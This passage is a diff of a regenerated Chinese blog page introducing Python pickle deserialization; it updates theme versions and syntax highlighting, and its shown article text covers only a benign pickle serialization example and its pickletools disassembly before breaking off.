@@ -1,11 +1,11 @@
-<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="Extrader"><meta name="copyright" content="Extrader"><meta name="generator" content="Hexo 5.2.0"><meta name="theme" content="hexo-theme-yun"><title>Python反序列化漏洞浅析 | Extraderの博客</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/star-markdown-css@0.1.24/dist/yun/yun-markdown.min.css"><script src="//at.alicdn.com/t/font_1140697_j5gk85dg4pf.js" async></script><script src="https://cdn.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>document.addEventListener("DOMContentLoaded", () => {
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="Extrader"><meta name="copyright" content="Extrader"><meta name="generator" content="Hexo 5.4.0"><meta name="theme" content="hexo-theme-yun"><title>Python反序列化漏洞浅析 | Extraderの博客</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/star-markdown-css@0.1.24/dist/yun/yun-markdown.min.css"><script src="//at.alicdn.com/t/font_1140697_j5gk85dg4pf.js" async></script><script src="https://cdn.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>document.addEventListener("DOMContentLoaded", () => {
   [".post-card",".post-content img"].forEach((target)=> {
     ScrollReveal().reveal(target);
   })
 });
-</script><link class="aplayer-style-marker" rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.css"><script class="aplayer-script-marker" src="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.js" defer></script><script class="meting-script-marker" src="https://cdn.jsdelivr.net/npm/meting@1/dist/Meting.min.js" defer></script><link id="light-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism.css" media="(prefers-color-scheme: light)"><link id="dark-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism-tomorrow.css" media="(prefers-color-scheme: dark)"><link rel="shortcut icon" type="image/svg+xml" href="/favico.ico"><link rel="mask-icon" href="/favico.ico" color="#0078E7"><link rel="alternate icon" href="/yun.ico"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="preload" href="/js/utils.js" as="script"><link rel="preload" href="/js/hexo-theme-yun.js" as="script"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><script id="yun-config">
+</script><link class="aplayer-style-marker" rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.css"><script class="aplayer-script-marker" src="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.js" defer></script><script class="meting-script-marker" src="https://cdn.jsdelivr.net/npm/meting@1/dist/Meting.min.js" defer></script><link id="light-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism.css" media="(prefers-color-scheme: light)"><link id="dark-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism-tomorrow.css" media="(prefers-color-scheme: dark)"><link rel="icon" href="/favico.ico"><link rel="mask-icon" href="/favico.ico" color="#0078E7"><link rel="alternate icon" href="/yun.ico"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="preload" href="/js/utils.js" as="script"><link rel="preload" href="/js/hexo-theme-yun.js" as="script"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><script id="yun-config">
     const Yun = window.Yun || {};
-    window.CONFIG = {"hostname":"www.extrader.top","root":"/","title":["Under","The","Sea"],"version":"1.5.3","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.jsdelivr.net/gh/YunYouJun/cdn/img/avatar/none.jpg","say":{"api":"https://v1.hitokoto.cn","hitokoto":true},"local_search":{"path":"/search.xml"},"fireworks":{"colors":["102, 167, 221","62, 131, 225","33, 78, 194","3, 28, 95","0, 8, 55"]}};
+    window.CONFIG = {"hostname":"www.extrader.top","root":"/","title":["Under","The","Sea"],"version":"1.6.1","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.jsdelivr.net/gh/YunYouJun/cdn/img/avatar/none.jpg","say":{"api":"https://v1.hitokoto.cn","hitokoto":true},"local_search":{"path":"/search.xml"},"fireworks":{"colors":["102, 167, 221","62, 131, 225","33, 78, 194","3, 28, 95","0, 8, 55"]}};
   </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/utils.js"></script><script src="/js/hexo-theme-yun.js"></script><link rel="alternate" href="/atom.xml" title="Extraderの博客" type="application/atom+xml"><script>(function(){
   var bp = document.createElement('script');
   var curProtocol = window.location.protocol.split(':')[0];
@@ -39,10 +39,10 @@
 <meta property="article:tag" content="python">
 <meta property="article:tag" content="反序列化">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20200405204254190.png"><script src="/js/ui/mode.js"></script><link rel="stylesheet" href="/css/prism.css" type="text/css"></head><body><script defer src="https://cdn.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-list-ordered"></use></svg></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-passport-line"></use></svg></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="Extrader"><img width="96" loading="lazy" src="/images/avatar.png" alt="Extrader"></a><div class="site-author-name"><a href="/about/">Extrader</a></div><a class="site-name" href="/about/site.html">Extraderの博客</a><sub class="site-subtitle"></sub><div class="site-desciption">不要给自己制造舒适区</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-home-4-line"></use></svg></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-archive-line"></use></svg></span><span class="site-state-item-count">47</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-2-line"></use></svg></span><span class="site-state-item-count">8</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="site-state-item-count">31</span></a></div><a class="site-state-item hty-icon-button" href="/links/" title="友链"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-open-arm-line"></use></svg></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="/atom.xml" title="RSS" target="_blank" style="color:orange"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-rss-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://wpa.qq.com/msgrd?v=3&amp;uin=710712799&amp;site=qq&amp;menu=yes" title="QQ" target="_blank" style="color:#12B7F5"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-qq-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/Extrader-home" title="GitHub" target="_blank" style="color:#6e5494"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-github-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:nowczj@gmail.com" title="E-Mail" target="_blank" style="color:#8E71C1"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-mail-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://weibo.com/extraderhome" title="微博" target="_blank" style="color:#E6162D"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-weibo-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://music.163.com/#/user/home?id=414334284" title="网易云音乐" target="_blank" style="color:#C10D0C"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-netease-cloud-music-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://www.zhihu.com/people/Extraderhome/" title="知乎" target="_blank" style="color:#0084FF"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-zhihu-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://space.bilibili.com/397842685" title="哔哩哔哩动画" target="_blank" style="color:#FF8EB3"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-bilibili-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://twitter.com/Extrader_" title="Twitter" target="_blank" style="color:#1da1f2"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-twitter-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://t.me/extraderhome" title="Telegram" target="_blank" style="color:#0088CC"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-telegram-line"></use></svg></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/girls/" title="喜欢的女孩子" style="color:hotpink"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-women-line"></use></svg></a><a class="links-item hty-icon-button" href="/albums/" title="相册" style="color:undefined"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-gallery-line"></use></svg></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-contrast-2-line"></use></svg></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#pickle%E5%BA%93"><span class="toc-number">1.</span> <span class="toc-text">pickle库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pickletools%E5%BA%93"><span class="toc-number">2.</span> <span class="toc-text">pickletools库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RCE"><span class="toc-number">3.</span> <span class="toc-text">RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#reduce"><span class="toc-number">3.1.</span> <span class="toc-text">__reduce__</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#c%E6%8C%87%E4%BB%A4%E7%A0%81"><span class="toc-number">3.2.</span> <span class="toc-text">c指令码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#setstate"><span class="toc-number">3.3.</span> <span class="toc-text">setstate</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%86%E8%8A%82"><span class="toc-number">4.</span> <span class="toc-text">细节</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">5.</span> <span class="toc-text">参考</span></a></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article"><link itemprop="mainEntityOfPage" href="https://www.extrader.top/posts/488d0f65/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="Extrader"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="Extraderの博客"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">Python反序列化漏洞浅析</h1><div class="post-meta"><div class="post-time" style="display:inline-block"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-line"></use></svg></span> <span class="post-meta-icon-text">发表于</span> <time title="创建时间：2020-04-05 18:59:03" itemprop="dateCreated datePublished" datetime="2020-04-05T18:59:03+08:00">2020-04-05</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-2-line"></use></svg></span> <span class="post-meta-icon-text">更新于</span> <time title="修改时间：2020-07-14 20:52:02" itemprop="dateModified" datetime="2020-07-14T20:52:02+08:00">2020-07-14</time></div><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-line"></use></svg></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/%E5%A4%87%E5%BF%98%E5%BD%95/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">备忘录</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/python/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">python</span></a><a class="tag-item" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">反序列化</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body" style="--smc-primary:#0078E7;"><h3 id="pickle库"><a href="#pickle库" class="headerlink" title="pickle库"></a>pickle库</h3><p>说到python反序列化就当然离不开<code>pickle</code>库</p>
+<meta name="twitter:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20200405204254190.png"><script src="/js/ui/mode.js"></script></head><body><script defer src="https://cdn.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-list-ordered"></use></svg></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-passport-line"></use></svg></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="Extrader"><img width="96" loading="lazy" src="/images/avatar.png" alt="Extrader"></a><div class="site-author-name"><a href="/about/">Extrader</a></div><a class="site-name" href="/about/site.html">Extraderの博客</a><sub class="site-subtitle"></sub><div class="site-desciption">不要给自己制造舒适区</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-home-4-line"></use></svg></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-archive-line"></use></svg></span><span class="site-state-item-count">47</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-2-line"></use></svg></span><span class="site-state-item-count">8</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="site-state-item-count">31</span></a></div><a class="site-state-item hty-icon-button" href="/links/" title="友链"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-open-arm-line"></use></svg></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="/atom.xml" title="RSS" target="_blank" style="color:orange"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-rss-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://wpa.qq.com/msgrd?v=3&amp;uin=710712799&amp;site=qq&amp;menu=yes" title="QQ" target="_blank" style="color:#12B7F5"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-qq-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/Extrader-home" title="GitHub" target="_blank" style="color:#6e5494"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-github-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:nowczj@gmail.com" title="E-Mail" target="_blank" style="color:#8E71C1"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-mail-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://weibo.com/extraderhome" title="微博" target="_blank" style="color:#E6162D"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-weibo-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://music.163.com/#/user/home?id=414334284" title="网易云音乐" target="_blank" style="color:#C10D0C"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-netease-cloud-music-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://www.zhihu.com/people/Extraderhome/" title="知乎" target="_blank" style="color:#0084FF"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-zhihu-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://space.bilibili.com/397842685" title="哔哩哔哩动画" target="_blank" style="color:#FF8EB3"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-bilibili-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://twitter.com/Extrader_" title="Twitter" target="_blank" style="color:#1da1f2"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-twitter-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://t.me/extraderhome" title="Telegram" target="_blank" style="color:#0088CC"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-telegram-line"></use></svg></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/girls/" title="喜欢的女孩子" style="color:hotpink"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-women-line"></use></svg></a><a class="links-item hty-icon-button" href="/albums/" title="相册" style="color:undefined"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-gallery-line"></use></svg></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-contrast-2-line"></use></svg></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#pickle%E5%BA%93"><span class="toc-number">1.</span> <span class="toc-text">pickle库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pickletools%E5%BA%93"><span class="toc-number">2.</span> <span class="toc-text">pickletools库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RCE"><span class="toc-number">3.</span> <span class="toc-text">RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#reduce"><span class="toc-number">3.1.</span> <span class="toc-text">__reduce__</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#c%E6%8C%87%E4%BB%A4%E7%A0%81"><span class="toc-number">3.2.</span> <span class="toc-text">c指令码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#setstate"><span class="toc-number">3.3.</span> <span class="toc-text">setstate</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%86%E8%8A%82"><span class="toc-number">4.</span> <span class="toc-text">细节</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">5.</span> <span class="toc-text">参考</span></a></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article"><link itemprop="mainEntityOfPage" href="https://www.extrader.top/posts/488d0f65/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="Extrader"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="Extraderの博客"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">Python反序列化漏洞浅析</h1><div class="post-meta"><div class="post-time" style="display:inline-block"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-line"></use></svg></span> <span class="post-meta-icon-text">发表于</span> <time title="创建时间：2020-04-05 18:59:03" itemprop="dateCreated datePublished" datetime="2020-04-05T18:59:03+08:00">2020-04-05</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-2-line"></use></svg></span> <span class="post-meta-icon-text">更新于</span> <time title="修改时间：2020-07-14 20:52:02" itemprop="dateModified" datetime="2020-07-14T20:52:02+08:00">2020-07-14</time></div><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-line"></use></svg></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/%E5%A4%87%E5%BF%98%E5%BD%95/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">备忘录</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/python/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">python</span></a><a class="tag-item" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">反序列化</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body" style="--smc-primary:#0078E7;"><h3 id="pickle库"><a href="#pickle库" class="headerlink" title="pickle库"></a>pickle库</h3><p>说到python反序列化就当然离不开<code>pickle</code>库</p>
 <p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20200405204254190.png" alt loading="lazy"></p>
 <p>以上例子简单的示范了python进行序列化和反序列化的操作</p>
-<a id="more"></a>
+<span id="more"></span>
 
 <h3 id="pickletools库"><a href="#pickletools库" class="headerlink" title="pickletools库"></a>pickletools库</h3><p>为了能够更深层的理解python反序列化的过程，这里需要用到一个python自带的pickle调试器<code>pickletools</code>库，这个库有三个功能：</p>
 <ul>
@@ -59,19 +59,19 @@
 <p>栈是反序列化最核心的数据结构，所有的数据操作几乎都在栈上。为了应对数据嵌套，栈区分为两个部分：当前栈专注于维护最顶层的信息，前序栈保存了程序运行至今的（不在顶层的）完整的栈信息。</p>
 <p>存储区可以类比内存，用于存取变量。它是一个数组，以下标为索引。它的每一个单元可以用来存储任何东西。</p>
 <p>下面我们试图来序列化一个类</p>
-<pre class="language-python" data-language="python"><code class="language-python">import pickle
-import pickletools
-class dairy():
-    def __init__(self):
-        self.date &#x3D; 20202020
-        self.text &#x3D; &#39;语言&#39;
-        self.tode &#x3D; [&#39;计&#39;,&#39;算&#39;,&#39;机&#39;]
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pickle
+<span class="token keyword">import</span> pickletools
+<span class="token keyword">class</span> <span class="token class-name">dairy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        self<span class="token punctuation">.</span>date <span class="token operator">=</span> <span class="token number">20202020</span>
+        self<span class="token punctuation">.</span>text <span class="token operator">=</span> <span class="token string">'语言'</span>
+        self<span class="token punctuation">.</span>tode <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'计'</span><span class="token punctuation">,</span><span class="token string">'算'</span><span class="token punctuation">,</span><span class="token string">'机'</span><span class="token punctuation">]</span>
         
-today &#x3D; dairy()
-print(pickle.dumps(today))
-x &#x3D; pickle.dumps(today)
-x &#x3D; pickletools.optimize(x)   #优化，消除未使用的PUT
-pickletools.dis(x)     #反汇编一个已经打包的字符串，优化一个已经被打包的字符串</code></pre>
+today <span class="token operator">=</span> dairy<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>today<span class="token punctuation">)</span><span class="token punctuation">)</span>
+x <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>today<span class="token punctuation">)</span>
+x <span class="token operator">=</span> pickletools<span class="token punctuation">.</span>optimize<span class="token punctuation">(</span>x<span class="token punctuation">)</span>   <span class="token comment">#优化，消除未使用的PUT</span>
+pickletools<span class="token punctuation">.</span>dis<span class="token punctuation">(</span>x<span class="token punctuation">)</span>     <span class="token comment">#反汇编一个已经打包的字符串，优化一个已经被打包的字符串</span></code></pre>
 
 <p><code>pickle</code>构造出的字符串有很多个版本，在<code>pickle.loads</code>时可以用<code>protocol</code>参数指定协议的版本，目前这些协议有0,1,2,3,4号版本，默认使用的是3号版本，pickle协议版本向前兼容，所以不用担心0号版本的字符串交给<code>pickle.loads</code>后会发生什么意外</p>
 <ul>
@@ -82,28 +82,28 @@ pickletools.dis(x)     #反汇编一个已经打包的字符串，优化一个�
 <li><strong>v4</strong> 版协议添加于 Python 3.4。它支持存储非常大的对象，能存储更多种类的对象，还包括一些针对数据格式的优化。有关第 4 版协议带来改进的信息，请参阅 PEP 3154。</li>
 </ul>
 <p>以上代码除了将序列化后的字符串反汇编后还用<code>pickletools</code>的<code>optimize</code>方法来将反汇编后的代码进行了优化，优化后输出的结果如下：</p>
-<pre class="language-shell" data-language="shell"><code class="language-shell">b&#39;\x80\x03c__main__\ndairy\nq\x00)\x81q\x01&#125;q\x02(X\x04\x00\x00\x00dateq\x03J$B4\x01X\x04\x00\x00\x00textq\x04X\x06\x00\x00\x00\xe8\xaf\xad\xe8\xa8\x80q\x05X\x04\x00\x00\x00todeq\x06]q\x07(X\x03\x00\x00\x00\xe8\xae\xa1q\x08X\x03\x00\x00\x00\xe7\xae\x97q\tX\x03\x00\x00\x00\xe6\x9c\xbaq\neub.&#39;    
-    0: \x80 PROTO      3
-    2: c    GLOBAL     &#39;__main__ dairy&#39;
-   18: )    EMPTY_TUPLE
-   19: \x81 NEWOBJ
-   20: &#125;    EMPTY_DICT
-   21: (    MARK
-   22: X        BINUNICODE &#39;date&#39;
-   31: J        BININT     20202020
-   36: X        BINUNICODE &#39;text&#39;
-   45: X        BINUNICODE &#39;语言&#39;
-   56: X        BINUNICODE &#39;tode&#39;
-   65: ]        EMPTY_LIST
-   66: (        MARK
-   67: X            BINUNICODE &#39;计&#39;
-   75: X            BINUNICODE &#39;算&#39;
-   83: X            BINUNICODE &#39;机&#39;
-   91: e            APPENDS    (MARK at 66)
-   92: u        SETITEMS   (MARK at 21)
-   93: b    BUILD
-   94: .    STOP
-highest protocol among opcodes &#x3D; 2</code></pre>
+<pre class="language-shell" data-language="shell"><code class="language-shell">b<span class="token string">'<span class="token entity" title="\x80">\x80</span><span class="token entity" title="\x03">\x03</span>c__main__<span class="token entity" title="\n">\n</span>dairy<span class="token entity" title="\n">\n</span>q<span class="token entity" title="\x00">\x00</span>)<span class="token entity" title="\x81">\x81</span>q<span class="token entity" title="\x01">\x01</span>&#125;q<span class="token entity" title="\x02">\x02</span>(X<span class="token entity" title="\x04">\x04</span><span class="token entity" title="\x00">\x00</span><span class="token entity" title="\x00">\x00</span><span class="token entity" title="\x00">\x00</span>dateq<span class="token entity" title="\x03">\x03</span>J<span class="token variable">$B4</span><span class="token entity" title="\x01">\x01</span>X<span class="token entity" title="\x04">\x04</span><span class="token entity" title="\x00">\x00</span><span class="token entity" title="\x00">\x00</span><span class="token 